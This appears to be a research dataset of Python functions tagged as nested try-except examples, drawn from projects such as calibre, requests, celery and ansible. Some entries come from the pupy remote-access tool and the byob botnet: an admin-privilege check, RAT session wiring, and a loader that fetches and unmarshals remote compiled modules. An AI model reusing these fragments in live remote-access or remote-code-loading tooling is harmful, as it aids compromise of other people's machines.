                    'AND NOT ((___ExpirationStatus=3 OR ___ExpirationStatus IS Null) %(expiry)s)'
                    ) % \
                    dict(expiry=' and ContentType = 6' if self.show_archived_books else '')
            else:
                where_clause = ' WHERE BookID IS NULL'

            # Note: The card condition should not need the contentId test for the SD
            # card. But the ExternalId does not get set for sideloaded kepubs on the
            # SD card.
            card_condition = ''
            if self.has_externalid():
                card_condition = "" AND (externalId IS NOT NULL AND externalId <> '' OR contentId LIKE 'file:///mnt/sd/%')"" if oncard == 'carda' else (
                    "" AND (externalId IS NULL OR externalId = '') AND contentId NOT LIKE 'file:///mnt/sd/%'"")
            else:
                card_condition = "" AND contentId LIKE 'file:///mnt/sd/%'"" if oncard == 'carda' else "" AND contentId NOT LIKE'file:///mnt/sd/%'""

            query = 'SELECT ' + columns + ' FROM content ' + where_clause + card_condition
            debug_print(""KoboTouch:books - query="", query)

            cursor = connection.cursor()
            try:
                cursor.execute(query)
            except Exception as e:
                err = str(e)
                if not (any_in(err, '___ExpirationStatus', 'FavouritesIndex', 'Accessibility', 'IsDownloaded', 'Series', 'ExternalId')):
                    raise
                query= ('SELECT Title, Attribution, DateCreated, ContentID, MimeType, ContentType, '
                        'ImageId, ReadStatus, -1 AS ___ExpirationStatus, ""-1"" AS FavouritesIndex, '
                        'null AS ISBN, NULL AS Language '
                        '-1 AS Accessibility, 1 AS IsDownloaded, NULL AS Series, NULL AS SeriesNumber, null as Subtitle '
                        'FROM content '
                        'WHERE BookID IS NULL'
                        )
                cursor.execute(query)

            changed = False
            i = 0
            for row in cursor:
                i += 1
#                 self.report_progress((i) / float(books_on_device), _('Getting list of books on device...'))
                show_debug = self.is_debugging_title(row['Title'])
                if show_debug:
                    debug_print(""KoboTouch:books - looping on database - row=%d"" % i)
                    debug_print(""KoboTouch:books - title='%s'""%row['Title'], ""authors="", row['Attribution'])
                    debug_print(""KoboTouch:books - row="", row)
                if not hasattr(row['ContentID'], 'startswith') or row['ContentID'].lower().startswith(
                        ""file:///usr/local/kobo/help/"") or row['ContentID'].lower().startswith(""/usr/local/kobo/help/""):
                    # These are internal to the Kobo device and do not exist
                    continue
                externalId = None if row['ExternalId'] and len(row['ExternalId']) == 0 else row['ExternalId']
                path = self.path_from_contentid(row['ContentID'], row['ContentType'], row['MimeType'], oncard, externalId)
                if show_debug:
                    debug_print(""KoboTouch:books - path='%s'""%path, ""  ContentID='%s'""%row['ContentID'], "" externalId=%s"" % externalId)

                bookshelves = get_bookshelvesforbook(connection, row['ContentID'])

                prefix = self._card_a_prefix if oncard == 'carda' else self._main_prefix
                changed = update_booklist(prefix, path, row['ContentID'], row['ContentType'], row['MimeType'], row['ImageId'],
                                          row['Title'], row['Attribution'], row['DateCreated'], row['Description'], row['Publisher'],
                                          row['Series'], row['SeriesNumber'], row['SeriesID'], row['SeriesNumberFloat'],
                                          row['ISBN'], row['Language'], row['Subtitle'],
                                          row['ReadStatus'], row['___ExpirationStatus'],
                                          int(row['FavouritesIndex']), row['Accessibility'], row['IsDownloaded'],
                                          row['___UserID'], bookshelves,
                                          book_stats={
                                                'StorePages': row['StorePages'],
                                                'StoreWordCount': row['StoreWordCount'],
                                                'StoreTimeToReadLowerEstimate': row['StoreTimeToReadLowerEstimate'],
                                                'StoreTimeToReadUpperEstimate': row['StoreTimeToReadUpperEstimate']
                                                }
                                          )

                if changed:
                    need_sync = True

            cursor.close()

            if not prefs['manage_device_metadata'] == 'on_connect':
                self.dump_bookshelves(connection)
            else:
                debug_print(""KoboTouch:books - automatically managing metadata"")
            debug_print(""KoboTouch:books - self.kobo_series_dict="", self.kobo_series_dict)
        # Remove books that are no longer in the filesystem. Cache contains
        # indices into the booklist if book not in filesystem, None otherwise
        # Do the operation in reverse order so indices remain valid
        for idx in sorted(itervalues(bl_cache), reverse=True, key=lambda x: x or -1):
            if idx is not None:
                if not os.path.exists(self.normalize_path(os.path.join(prefix, bl[idx].lpath))) or not bl[idx].contentID:
                    need_sync = True
                    del bl[idx]
                else:
                    debug_print(""KoboTouch:books - Book in mtadata.calibre, on file system but not database - bl[idx].title:'%s'""%bl[idx].title)

        # print ""count found in cache: %d, count of files in metadata: %d, need_sync: %s"" % \
        #      (len(bl_cache), len(bl), need_sync)
        # Bypassing the KOBO sync_booklists as that does things we don't need to do
        # Also forcing sync to see if this solves issues with updating shelves and matching books.
        if need_sync or True:  # self.count_found_in_bl != len(bl) or need_sync:
            debug_print(""KoboTouch:books - about to sync_booklists"")
            if oncard == 'cardb':
                USBMS.sync_booklists(self, (None, None, bl))
            elif oncard == 'carda':
                USBMS.sync_booklists(self, (None, bl, None))
            else:
                USBMS.sync_booklists(self, (bl, None, None))
            debug_print(""KoboTouch:books - have done sync_booklists"")

        self.report_progress(1.0, _('Getting list of books on device...'))
        debug_print(""KoboTouch:books - end - oncard='%s'""%oncard)
        return bl",Nested Try-Except Blocks,1
224,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/external/BeRoot/Windows/BeRoot/beroot/modules/checks/system.py,can_get_admin_access,"def can_get_admin_access():
    """"""
    Check if the user may be able to get administrator access.
    Returns True if the user is in the administrator's group.
    Otherwise returns False
    """"""
    SECURITY_MAX_SID_SIZE = 68
    WinBuiltinAdministratorsSid = 26
    ERROR_NO_SUCH_LOGON_SESSION = 1312
    ERROR_PRIVILEGE_NOT_HELD = 1314
    TokenLinkedToken = 19

    #  On XP or lower this is equivalent to has_root()
    if sys.getwindowsversion()[0] < 6:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())

    #  On Vista or higher, there's the whole UAC token-splitting thing.
    #  Many thanks for Junfeng Zhang for the workflow:
    # htttp://blogs.msdn.com/junfeng/archive/2007/01/26/how-to-tell-if-the-current-user-is-in-administrators-group-programmatically.aspx

    proc = ctypes.windll.kernel32.GetCurrentProcess()

    #  Get the token for the current process.
    try:
        token = ctypes.wintypes.HANDLE()
        ctypes.windll.advapi32.OpenProcessToken(proc, TOKEN_READ, ctypes.byref(token))
        try:
            #  Get the administrators SID.
            sid = ctypes.create_string_buffer(SECURITY_MAX_SID_SIZE)
            sz = ctypes.wintypes.DWORD(SECURITY_MAX_SID_SIZE)
            ctypes.windll.advapi32.CreateWellKnownSid(WinBuiltinAdministratorsSid, None, ctypes.byref(sid), ctypes.byref(sz))

            #  Check whether the token has that SID directly.
            has_admin = ctypes.wintypes.BOOL()
            ctypes.windll.advapi32.CheckTokenMembership(None, ctypes.byref(sid), ctypes.byref(has_admin))
            if has_admin.value:
                return True

            #  Get the linked token.  Failure may mean no linked token.
            ltoken = ctypes.wintypes.HANDLE()
            try:
                cls = TokenLinkedToken
                ctypes.windll.advapi32.GetTokenInformation(token, cls, ctypes.byref(ltoken), ctypes.sizeof(ltoken), ctypes.byref(sz))
            except WindowsError as e:
                if e.winerror == ERROR_NO_SUCH_LOGON_SESSION:
                    return False
                elif e.winerror == ERROR_PRIVILEGE_NOT_HELD:
                    return False
                else:
                    raise
            #  Check if the linked token has the admin SID
            try:
                ctypes.windll.advapi32.CheckTokenMembership(ltoken, ctypes.byref(sid), ctypes.byref(has_admin))
                return bool(has_admin.value)
            finally:
                ctypes.windll.kernel32.CloseHandle(ltoken)
        finally:
            ctypes.windll.kernel32.CloseHandle(token)
    except Exception:
        return None
    finally:
        try:
            ctypes.windll.kernel32.CloseHandle(proc)
        except Exception:
            pass",Nested Try-Except Blocks,1
225,byob,/home/r4ph/desenv/phd/exception-miner/projects/py/byob/byob/core/loader.py,__fetch_compiled,"def __fetch_compiled(self, url):
        import marshal
        module_src = None
        try:
            module_compiled = urlopen(url + 'c').read()
            try:
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError:
                pass
            try:
                module_src = marshal.loads(module_compiled[12:])  # Strip the .pyc file header of Python 3.3 and onwards (changed .pyc spec)
                return module_src
            except ValueError:
                pass
        except IOError as e:
            log(level='debug', info= ""[-] No compiled version ('.pyc') for '%s' module found!"" % url.split('/')[-1])
        return module_src",Nested Try-Except Blocks,1
226,requests,/home/r4ph/desenv/exception-miner/projects/py/requests/requests/utils.py,get_netrc_auth,"def get_netrc_auth(url, raise_errors=False):
    """"""Returns the Requests tuple auth for a given url from netrc.""""""

    netrc_file = os.environ.get(""NETRC"")
    if netrc_file is not None:
        netrc_locations = (netrc_file,)
    else:
        netrc_locations = (f""~/{f}"" for f in NETRC_FILES)

    try:
        from netrc import NetrcParseError, netrc

        netrc_path = None

        for f in netrc_locations:
            try:
                loc = os.path.expanduser(f)
            except KeyError:
                # os.path.expanduser can fail when $HOME is undefined and
                # getpwuid fails. See https://bugs.python.org/issue20164 &
                # https://github.com/psf/requests/issues/1846
                return

            if os.path.exists(loc):
                netrc_path = loc
                break

        # Abort early if there isn't one.
        if netrc_path is None:
            return

        ri = urlparse(url)

        # Strip port numbers from netloc. This weird `if...encode`` dance is
        # used for Python 3.2, which doesn't support unicode literals.
        splitstr = b"":""
        if isinstance(url, str):
            splitstr = splitstr.decode(""ascii"")
        host = ri.netloc.split(splitstr)[0]

        try:
            _netrc = netrc(netrc_path).authenticators(host)
            if _netrc:
                # Return with login / password
                login_i = 0 if _netrc[0] else 1
                return (_netrc[login_i], _netrc[2])
        except (NetrcParseError, OSError):
            # If there was a parsing error or a permissions issue reading the file,
            # we'll just skip netrc auth unless explicitly asked to raise errors.
            if raise_errors:
                raise

    # App Engine hackiness.
    except (ImportError, AttributeError):
        pass",Nested Try-Except Blocks,1
227,tqdm,/home/r4ph/desenv/exception-miner/projects/py/tqdm/tqdm/utils.py,inner,"def inner(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except OSError as e:
                if e.errno != 5:
                    raise
                try:
                    tqdm_instance.miniters = float('inf')
                except ReferenceError:
                    pass
            except ValueError as e:
                if 'closed' not in str(e):
                    raise
                try:
                    tqdm_instance.miniters = float('inf')
                except ReferenceError:
                    pass",Nested Try-Except Blocks,1
228,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/concurrency/asynpool.py,schedule_writes,"def schedule_writes(ready_fds, total_write_count=None):
            if not total_write_count:
                total_write_count = [0]
            # Schedule write operation to ready file descriptor.
            # The file descriptor is writable, but that does not
            # mean the process is currently reading from the socket.
            # The socket is buffered so writable simply means that
            # the buffer can accept at least 1 byte of data.

            # This means we have to cycle between the ready fds.
            # the first version used shuffle, but this version
            # using `total_writes % ready_fds` is about 30% faster
            # with many processes, and also leans more towards fairness
            # in write stats when used with many processes
            # [XXX On macOS, this may vary depending
            # on event loop implementation (i.e, select/poll vs epoll), so
            # have to test further]
            num_ready = len(ready_fds)

            for _ in range(num_ready):
                ready_fd = ready_fds[total_write_count[0] % num_ready]
                total_write_count[0] += 1
                if ready_fd in active_writes:
                    # already writing to this fd
                    continue
                if is_fair_strategy and ready_fd in busy_workers:
                    # worker is already busy with another task
                    continue
                if ready_fd not in all_inqueues:
                    hub_remove(ready_fd)
                    continue
                try:
                    job = pop_message()
                except IndexError:
                    # no more messages, remove all inactive fds from the hub.
                    # this is important since the fds are always writable
                    # as long as there's 1 byte left in the buffer, and so
                    # this may create a spinloop where the event loop
                    # always wakes up.
                    for inqfd in diff(active_writes):
                        hub_remove(inqfd)
                    break

                else:
                    if not job._accepted:  # job not accepted by another worker
                        try:
                            # keep track of what process the write operation
                            # was scheduled for.
                            proc = job._scheduled_for = fileno_to_inq[ready_fd]
                        except KeyError:
                            # write was scheduled for this fd but the process
                            # has since exited and the message must be sent to
                            # another process.
                            put_message(job)
                            continue
                        cor = _write_job(proc, ready_fd, job)
                        job._writer = ref(cor)
                        mark_write_gen_as_active(cor)
                        mark_write_fd_as_active(ready_fd)
                        mark_worker_as_busy(ready_fd)

                        # Try to write immediately, in case there's an error.
                        try:
                            next(cor)
                        except StopIteration:
                            pass
                        except OSError as exc:
                            if exc.errno != errno.EBADF:
                                raise
                        else:
                            add_writer(ready_fd, cor)",Nested Try-Except Blocks,1
229,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/archivebox/logging_util.py,end,"def end(self):
        """"""immediately end progress, clear the progressbar line, and save end_ts""""""


        end_ts = datetime.now(timezone.utc)
        self.stats['end_ts'] = end_ts
        
        if self.SHOW_PROGRESS:
            # terminate if we havent already terminated
            try:
                # kill the progress bar subprocess
                try:
                    self.p.close()   # must be closed *before* its terminnated
                except (KeyboardInterrupt, SystemExit):
                    print()
                    raise
                except BaseException:                                           # lgtm [py/catch-base-exception]
                    pass
                self.p.terminate()
                self.p.join()


                # clear whole terminal line
                try:
                    sys.stdout.write('\r{}{}\r'.format((' ' * TERM_WIDTH()), ANSI['reset']))
                except (IOError, BrokenPipeError):
                    # ignore when the parent proc has stopped listening to our stdout
                    pass
            except ValueError:
                pass",Nested Try-Except Blocks,1
230,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/dashboard/tests/test_dashboard.py,test_http_get,"def test_http_get(enable_test_module, ray_start_with_dashboard):
    assert wait_until_server_available(ray_start_with_dashboard[""webui_url""]) is True
    webui_url = ray_start_with_dashboard[""webui_url""]
    webui_url = format_web_url(webui_url)

    target_url = webui_url + ""/test/dump""

    timeout_seconds = 30
    start_time = time.time()
    while True:
        time.sleep(3)
        try:
            response = requests.get(webui_url + ""/test/http_get?url="" + target_url)
            response.raise_for_status()
            try:
                dump_info = response.json()
            except Exception as ex:
                logger.info(""failed response: %s"", response.text)
                raise ex
            assert dump_info[""result""] is True
            dump_data = dump_info[""data""]
            assert len(dump_data[""agents""]) == 1
            node_id, ports = next(iter(dump_data[""agents""].items()))
            ip = ray_start_with_dashboard[""node_ip_address""]
            http_port, grpc_port = ports

            response = requests.get(
                f""http://{ip}:{http_port}"" f""/test/http_get_from_agent?url={target_url}""
            )
            response.raise_for_status()
            try:
                dump_info = response.json()
            except Exception as ex:
                logger.info(""failed response: %s"", response.text)
                raise ex
            assert dump_info[""result""] is True
            break
        except (AssertionError, requests.exceptions.ConnectionError) as e:
            logger.info(""Retry because of %s"", e)
        finally:
            if time.time() > start_time + timeout_seconds:
                raise Exception(""Timed out while testing."")",Nested Try-Except Blocks,1
231,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/pupylib/PupyService.py,exposed_set_modules,"def exposed_set_modules(self, modules):
        try:
            self.modules = modules
            self.builtin = modules.__builtin__
            self.builtins = self.builtin

            try:
                self.namespace = self._conn.root.namespace
            except Exception, e:
                logger.exception(e)

            self.execute = self._conn.root.execute
            try:
                self.register_remote_cleanup = self._conn.root.register_cleanup
            except:
                self.register_remote_cleanup = None

            if self.register_remote_cleanup:
                try:
                    self.unregister_remote_cleanup = self._conn.root.unregister_cleanup
                except:
                    self.unregister_remote_cleanup = None

                try:
                    self.obtain_call = self._conn.root.obtain_call
                except:
                    pass

            self.exit = self._conn.root.exit
            self.eval = self._conn.root.eval
            self.get_infos = self._conn.root.get_infos

            self.pupy_srv.add_client(self)

        except Exception:
            logger.error(traceback.format_exc())
            try:
                self._conn.close()
            except:
                pass",Nested Try-Except Blocks,1
232,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/localstack/utils/server/http2_server.py,run_server,"def run_server(
    port: int,
    bind_addresses: List[str],
    handler: Callable = None,
    asynchronous: bool = True,
    ssl_creds: Tuple[str, str] = None,
    max_content_length: int = None,
    send_timeout: int = None,
):
    """"""
    Run an HTTP2-capable Web server on the given port, processing incoming requests via a `handler` function.
    :param port: port to bind to
    :param bind_addresses: addresses to bind to
    :param handler: callable that receives the request and returns a response
    :param asynchronous: whether to start the server asynchronously in the background
    :param ssl_creds: optional tuple with SSL cert file names (cert file, key file)
    :param max_content_length: maximum content length of uploaded payload
    :param send_timeout: timeout (in seconds) for sending the request payload over the wire
    """"""

    ensure_event_loop()
    app = Quart(__name__, static_folder=None)
    app.config[""MAX_CONTENT_LENGTH""] = max_content_length or DEFAULT_MAX_CONTENT_LENGTH
    if send_timeout:
        app.config[""BODY_TIMEOUT""] = send_timeout

    @app.route(""/"", methods=HTTP_METHODS, defaults={""path"": """"})
    @app.route(""/<path:path>"", methods=HTTP_METHODS)
    async def index(path=None):
        response = await make_response(""{}"")
        if handler:
            data = await request.get_data()
            try:
                result = await run_sync(handler, request, data)
                if isinstance(result, Exception):
                    raise result
            except Exception as e:
                LOG.warning(
                    ""Error in proxy handler for request %s %s: %s %s"",
                    request.method,
                    request.url,
                    e,
                    traceback.format_exc(),
                )
                response.status_code = 500
                if isinstance(e, HTTPErrorResponse):
                    response.status_code = e.code or response.status_code
                return response
            if result is not None:
                # check if this is an async generator (for HTTP2 push event responses)
                async_gen = get_async_generator_result(result)
                if async_gen:
                    return async_gen
                # prepare and return regular response
                is_chunked = uses_chunked_encoding(result)
                result_content = result.content or """"
                response = await make_response(result_content)
                response.status_code = result.status_code
                if is_chunked:
                    response.headers.pop(""Content-Length"", None)
                result.headers.pop(""Server"", None)
                result.headers.pop(""Date"", None)
                headers = {k: str(v).replace(""\n"", r""\n"") for k, v in result.headers.items()}
                response.headers.update(headers)
                # set multi-value headers
                multi_value_headers = getattr(result, ""multi_value_headers"", {})
                for key, values in multi_value_headers.items():
                    for value in values:
                        response.headers.add_header(key, value)
                # set default headers, if required
                if not is_chunked and request.method not in [""OPTIONS"", ""HEAD""]:
                    response_data = await response.get_data()
                    response.headers[""Content-Length""] = str(len(response_data or """"))
                if ""Connection"" not in response.headers:
                    response.headers[""Connection""] = ""close""
                # fix headers for OPTIONS requests (possible fix for Firefox requests)
                if request.method == ""OPTIONS"":
                    response.headers.pop(""Content-Type"", None)
                    if not response.headers.get(""Cache-Control""):
                        response.headers[""Cache-Control""] = ""no-cache""
        return response

    def run_app_sync(*args, loop=None, shutdown_event=None):
        kwargs = {}
        config = Config()
        cert_file_name, key_file_name = ssl_creds or (None, None)
        if cert_file_name:
            kwargs[""certfile""] = cert_file_name
            config.certfile = cert_file_name
        if key_file_name:
            kwargs[""keyfile""] = key_file_name
            config.keyfile = key_file_name
        setup_quart_logging()
        config.bind = [f""{bind_address}:{port}"" for bind_address in bind_addresses]
        config.workers = len(bind_addresses)
        loop = loop or ensure_event_loop()
        run_kwargs = {}
        if shutdown_event:
            run_kwargs[""shutdown_trigger""] = shutdown_event.wait
        try:
            try:
                return loop.run_until_complete(serve(app, config, **run_kwargs))
            except Exception as e:
                LOG.info(
                    ""Error running server event loop on port %s: %s %s"",
                    port,
                    e,
                    traceback.format_exc(),
                )
                if ""SSL"" in str(e):
                    c_exists = os.path.exists(cert_file_name)
                    k_exists = os.path.exists(key_file_name)
                    c_size = len(load_file(cert_file_name)) if c_exists else 0
                    k_size = len(load_file(key_file_name)) if k_exists else 0
                    LOG.warning(
                        ""Unable to create SSL context. Cert files exist: %s %s (%sB), %s %s (%sB)"",
                        cert_file_name,
                        c_exists,
                        c_size,
                        key_file_name,
                        k_exists,
                        k_size,
                    )
                raise
        finally:
            try:
                _cancel_all_tasks(loop)
                loop.run_until_complete(loop.shutdown_asyncgens())
            finally:
                asyncio.set_event_loop(None)
                loop.close()

    class ProxyThread(FuncThread):
        def __init__(self):
            FuncThread.__init__(self, self.run_proxy, None, name=""proxy-thread"")
            self.shutdown_event = None
            self.loop = None

        def run_proxy(self, *args):
            self.loop = ensure_event_loop()
            self.shutdown_event = asyncio.Event()
            run_app_sync(loop=self.loop, shutdown_event=self.shutdown_event)

        def stop(self, quiet=None):
            event = self.shutdown_event

            async def set_event():
                event.set()

            run_coroutine(set_event(), self.loop)
            super().stop(quiet)

    def run_in_thread():
        thread = ProxyThread()
        thread.start()
        TMP_THREADS.append(thread)
        return thread

    if asynchronous:
        return run_in_thread()

    return run_app_sync()",Nested Try-Except Blocks,1
233,gunicorn,/home/r4ph/desenv/phd/exception-miner/projects/py/gunicorn/gunicorn/pidfile.py,validate,"def validate(self):
        """""" Validate pidfile and make it stale if needed""""""
        if not self.fname:
            return
        try:
            with open(self.fname, ""r"") as f:
                try:
                    wpid = int(f.read())
                except ValueError:
                    return

                try:
                    os.kill(wpid, 0)
                    return wpid
                except OSError as e:
                    if e.args[0] == errno.EPERM:
                        return wpid
                    if e.args[0] == errno.ESRCH:
                        return
                    raise
        except IOError as e:
            if e.args[0] == errno.ENOENT:
                return
            raise",Nested Try-Except Blocks,1
234,spyder,/home/r4ph/desenv/phd/exception-miner/projects/py/spyder/spyder/utils/external/lockfile.py,lock,"def lock(self):
        """"""
        Acquire this lock.

        @rtype: C{bool}
        @return: True if the lock is acquired, false otherwise.

        @raise: Any exception os.symlink() may raise, other than
        EEXIST.
        """"""
        clean = True
        while True:
            try:
                symlink(str(os.getpid()), self.name)
            except OSError as e:
                if _windows and e.errno in (errno.EACCES, errno.EIO):
                    # The lock is in the middle of being deleted because we're
                    # on Windows where lock removal isn't atomic.  Give up, we
                    # don't know how long this is going to take.
                    return False
                if e.errno == errno.EEXIST:
                    try:
                        pid = readlink(self.name)
                    except OSError as e:
                        if e.errno == errno.ENOENT:
                            # The lock has vanished, try to claim it in the
                            # next iteration through the loop.
                            continue
                        raise
                    except IOError as e:
                        if _windows and e.errno == errno.EACCES:
                            # The lock is in the middle of being
                            # deleted because we're on Windows where
                            # lock removal isn't atomic.  Give up, we
                            # don't know how long this is going to
                            # take.
                            return False
                        raise
                    try:
                        if kill is not None:
                            kill(int(pid), 0)
                        if not is_spyder_process(int(pid)):
                            raise(OSError(errno.ESRCH, 'No such process'))
                    except OSError as e:
                        if e.errno == errno.ESRCH:
                            # The owner has vanished, try to claim it in the
                            # next iteration through the loop.
                            try:
                                rmlink(self.name)
                            except OSError as e:
                                if e.errno == errno.ENOENT:
                                    # Another process cleaned up the lock.
                                    # Race them to acquire it in the next
                                    # iteration through the loop.
                                    continue
                                raise
                            clean = False
                            continue
                        raise
                    return False
                raise
            self.locked = True
            self.clean = clean
            return True",Nested Try-Except Blocks,1
235,ipython,/home/r4ph/desenv/exception-miner/projects/py/ipython/IPython/core/ultratb.py,text_repr,"def text_repr(value):
    """"""Hopefully pretty robust repr equivalent.""""""
    # this is pretty horrible but should always return *something*
    try:
        return pydoc.text.repr(value)  # type: ignore[call-arg]
    except KeyboardInterrupt:
        raise
    except:
        try:
            return repr(value)
        except KeyboardInterrupt:
            raise
        except:
            try:
                # all still in an except block so we catch
                # getattr raising
                name = getattr(value, '__name__', None)
                if name:
                    # ick, recursion
                    return text_repr(name)
                klass = getattr(value, '__class__', None)
                if klass:
                    return '%s instance' % text_repr(klass)
            except KeyboardInterrupt:
                raise
            except:
                return 'UNRECOVERABLE REPR FAILURE'",Nested Try-Except Blocks,1
236,jinja,/home/r4ph/desenv/phd/exception-miner/projects/py/jinja/src/jinja2/environment.py,getitem,"def getitem(
        self, obj: t.Any, argument: t.Union[str, t.Any]
    ) -> t.Union[t.Any, Undefined]:
        """"""Get an item or attribute of an object but prefer the item.""""""
        try:
            return obj[argument]
        except (AttributeError, TypeError, LookupError):
            if isinstance(argument, str):
                try:
                    attr = str(argument)
                except Exception:
                    pass
                else:
                    try:
                        return getattr(obj, attr)
                    except AttributeError:
                        pass
            return self.undefined(obj=obj, name=argument)",Nested Try-Except Blocks,1
237,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/app/builtins.py,unlock_chord,"def unlock_chord(self, group_id, callback, interval=None,
                     max_retries=None, result=None,
                     Result=app.AsyncResult, GroupResult=app.GroupResult,
                     result_from_tuple=result_from_tuple, **kwargs):
        if interval is None:
            interval = self.default_retry_delay

        # check if the task group is ready, and if so apply the callback.
        callback = maybe_signature(callback, app)
        deps = GroupResult(
            group_id,
            [result_from_tuple(r, app=app) for r in result],
            app=app,
        )
        j = deps.join_native if deps.supports_native_join else deps.join

        try:
            ready = deps.ready()
        except Exception as exc:
            raise self.retry(
                exc=exc, countdown=interval, max_retries=max_retries,
            )
        else:
            if not ready:
                raise self.retry(countdown=interval, max_retries=max_retries)

        callback = maybe_signature(callback, app=app)
        try:
            with allow_join_result():
                ret = j(
                    timeout=app.conf.result_chord_join_timeout,
                    propagate=True,
                )
        except Exception as exc:  # pylint: disable=broad-except
            try:
                culprit = next(deps._failed_join_report())
                reason = f'Dependency {culprit.id} raised {exc!r}'
            except StopIteration:
                reason = repr(exc)
            logger.exception('Chord %r raised: %r', group_id, exc)
            app.backend.chord_error_from_stack(callback, ChordError(reason))
        else:
            try:
                callback.delay(ret)
            except Exception as exc:  # pylint: disable=broad-except
                logger.exception('Chord %r raised: %r', group_id, exc)
                app.backend.chord_error_from_stack(
                    callback,
                    exc=ChordError(f'Callback error: {exc!r}'),
                )",Nested Try-Except Blocks,1
238,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/server/compiler_pool/worker_proc.py,main,"def main(get_handler):
    parser = argparse.ArgumentParser()
    parser.add_argument(""--sockname"")
    parser.add_argument(""--numproc"")
    parser.add_argument(""--version-serial"", type=int)
    args = parser.parse_args()

    ql_parser.preload_spec()
    gc.freeze()

    listen_for_debugger()

    if args.numproc is None:
        # Run a single worker process
        run_worker(args.sockname, args.version_serial, get_handler)
        return

    numproc = int(args.numproc)
    assert numproc >= 1

    # Abort the template process if more than `max_worker_spawns`
    # new workers are created continuously - it probably means the
    # worker cannot start correctly.
    max_worker_spawns = numproc * 2

    children = set()
    continuous_num_spawns = 0

    for _ in range(int(args.numproc)):
        # spawn initial workers
        if pid := os.fork():
            # main process
            children.add(pid)
            continuous_num_spawns += 1
        else:
            # child process
            break
    else:
        # main process - redirect SIGTERM to SystemExit and wait for children
        signal.signal(signal.SIGTERM, lambda *_: exit(os.EX_OK))
        last_spawn_timestamp = time.monotonic()

        try:
            while children:
                pid, status = os.wait()
                children.remove(pid)
                ec = os.waitstatus_to_exitcode(status)
                if ec > 0 or -ec not in {0, signal.SIGINT}:
                    # restart the child process if killed or ending abnormally,
                    # unless we tried too many times continuously
                    now = time.monotonic()
                    if now - last_spawn_timestamp > NUM_SPAWNS_RESET_INTERVAL:
                        continuous_num_spawns = 0
                    last_spawn_timestamp = now
                    continuous_num_spawns += 1
                    if continuous_num_spawns > max_worker_spawns:
                        # GOTCHA: we shouldn't return here because we need the
                        # exception handler below to clean up the workers
                        exit(os.EX_UNAVAILABLE)

                    if pid := os.fork():
                        # main process
                        children.add(pid)
                    else:
                        # child process
                        break
            else:
                # main process - all children ended normally
                return
        except BaseException as e:  # includes SystemExit and KeyboardInterrupt
            # main process - kill and wait for the remaining workers to exit
            try:
                signal.signal(signal.SIGTERM, signal.SIG_DFL)
                for pid in children:
                    try:
                        os.kill(pid, signal.SIGTERM)
                    except OSError:
                        pass
                try:
                    while children:
                        pid, status = os.wait()
                        children.discard(pid)
                except OSError:
                    pass
            finally:
                raise e

    # child process - clear the SIGTERM handler for potential Rust impl
    signal.signal(signal.SIGTERM, signal.SIG_DFL)
    run_worker(args.sockname, args.version_serial, get_handler)",Nested Try-Except Blocks,1
239,bup,/home/r4ph/desenv/phd/exception-miner/projects/py/bup/lib/bup/client.py,close,"def close(self):
        if self.closed:
            return
        self.closed = True
        try:
            if self.conn and not self._busy:
                self.conn.write(b'quit\n')
        finally:
            try:
                if self.pin:
                    self.pin.close()
            finally:
                try:
                    self.pin = None
                    if self.sock and self.sockw:
                        self.sockw.close()
                        self.sock.shutdown(socket.SHUT_WR)
                finally:
                    try:
                        if self.conn:
                            self.conn.close()
                    finally:
                        try:
                            self.conn = None
                            if self.pout:
                                self.pout.close()
                        finally:
                            try:
                                self.pout = None
                                if self.sock:
                                    self.sock.close()
                            finally:
                                self.sock = None
                                if self.p:
                                    self.p.wait()
                                    rv = self.p.wait()
                                    if rv:
                                        raise ClientError('server tunnel returned exit code %d' % rv)
                                self.p = None",Nested Try-Except Blocks,1
240,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/lib/ansible/modules/file.py,check_owner_exists,"def check_owner_exists(module, owner):
    try:
        uid = int(owner)
        try:
            getpwuid(uid).pw_name
        except KeyError:
            module.warn('failed to look up user with uid %s. Create user up to this point in real play' % uid)
    except ValueError:
        try:
            getpwnam(owner).pw_uid
        except KeyError:
            module.warn('failed to look up user %s. Create user up to this point in real play' % owner)",Nested Try-Except Blocks,1
241,great,/home/r4ph/desenv/phd/exception-miner/projects/py/great_expectations/great_expectations/dataset/pandas_dataset.py,_expect_column_values_to_be_in_type_list__aggregate,"def _expect_column_values_to_be_in_type_list__aggregate(  # noqa: PLR0913, PLR0912
        self,
        column,
        type_list,
        mostly=None,
        result_format=None,
        row_condition=None,
        condition_parser=None,
        include_config=True,
        catch_exceptions=None,
        meta=None,
    ):
        if mostly is not None:
            raise ValueError(
                ""PandasDataset cannot support mostly for a column with a non-object dtype.""
            )

        if type_list is None:
            success = True
        else:
            comp_types = []
            for type_ in type_list:
                try:
                    comp_types.append(np.dtype(type_).type)
                except TypeError:
                    try:
                        pd_type = getattr(pd, type_)
                        if isinstance(pd_type, type):
                            comp_types.append(pd_type)
                    except AttributeError:
                        pass

                    try:
                        pd_type = getattr(pd.core.dtypes.dtypes, type_)
                        if isinstance(pd_type, type):
                            comp_types.append(pd_type)
                    except AttributeError:
                        pass

                native_type = self._native_type_type_map(type_)
                if native_type is not None:
                    comp_types.extend(native_type)

            success = self[column].dtype.type in comp_types

        return {
            ""success"": success,
            ""result"": {""observed_value"": self[column].dtype.type.__name__},
        }",Nested Try-Except Blocks,1
242,avatarify,/home/r4ph/desenv/phd/exception-miner/projects/py/avatarify/afy/predictor_worker.py,recv_worker,"def recv_worker(port, recv_queue, worker_alive):
        timing = AccumDict()
        log = Logger('./var/log/recv_worker.log', verbose=opt.verbose)

        ctx = SerializingContext()
        socket = ctx.socket(zmq.PULL)
        socket.bind(f""tcp://*:{port}"")
        socket.RCVTIMEO = RECV_TIMEOUT

        log(f'Receiving on port {port}', important=True)

        try:
            while worker_alive.value:
                tt = TicToc()

                try:
                    tt.tic()
